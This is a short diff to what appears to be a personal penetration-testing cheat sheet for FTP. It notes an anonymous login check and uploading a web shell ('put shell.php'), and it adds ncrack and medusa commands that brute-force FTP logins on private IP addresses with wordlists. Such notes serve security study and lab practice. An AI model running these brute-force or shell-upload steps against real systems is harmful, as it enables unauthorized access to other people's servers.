@@ -13,3 +13,18 @@ anonymous login check
   
 file upload 
     put shell.php
+
+
+Bruteforcing login :
+  ncrack -U usernames.txt -P passwords.txt ftp://10.10.0.50
+  medusa -h 192.168.18.128 -U usernames.txt -P passwords.txt -M ftp 
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
